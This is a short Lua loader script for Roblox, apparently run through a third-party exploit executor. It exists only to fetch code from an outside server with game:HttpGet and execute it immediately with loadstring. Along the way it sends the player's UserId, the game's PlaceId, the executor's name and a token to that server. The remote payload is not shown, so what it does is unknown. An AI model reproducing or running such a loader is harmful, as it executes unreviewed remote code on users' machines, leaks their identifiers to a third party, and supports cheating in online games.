local l=game:GetService("Players").LocalPlayer
local o,x=pcall(function() return identifyexecutor() end)
local G=(getgenv and getgenv()) or _G
local p=(G.CCRAFT_PASS and G.CCRAFT_PASS["caf668e0"]) or ""
loadstring(game:HttpGet("https://api.ccraftspace.dpdns.org/p/caf668e023d145f0b94853378c333701?t=6adee874-15bb19fd76be6b5beecf8e4b-0-0-1b8ed3ae-2aa89b2c9d9cd6f42f8240efdc1787ff&p="..p.."&u="..(l and l.UserId or 0).."&g="..game.PlaceId.."&x="..tostring(o and x or ""):gsub("%W","")))()